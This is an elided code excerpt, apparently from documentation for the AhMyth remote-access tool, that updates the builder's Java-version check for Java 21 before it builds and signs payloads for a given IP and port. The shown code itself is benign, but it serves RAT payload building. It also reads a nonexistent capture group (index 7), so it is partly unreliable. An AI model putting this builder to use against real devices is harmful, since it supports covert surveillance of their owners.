...
<details>
    <summary>Updated JavaCheck functions for Java 21</summary>
    <br>
...
$appCtrl.Build = (ip, port) => {
    ...
    checkJavaVersion((error, javaVersion) => {
        if (error) {
            ...
            $appCtrl.Log('[¡] AhMyth Requires Java 21 to Decompile, Build and Sign Payloads.', CONSTANTS.logStatus.INFO);
            return;
    ...
    exec('java -version',
        (error, stdout, stderr) => {
            if (error) {
                ...
                // Updated regular expression to match Java 9+ and Java 8
                const versionMatch = versionOutput.match(/version "(\d+)\.(\d+)\.(\d+)|version "(\d+)\.(\d+)\.|version "(\d+)\-internal"/);
                if (versionMatch) {
                    // Extracting major version (capturing groups)
                    const majorVersion = versionMatch[1] || versionMatch[4] || versionMatch[7];
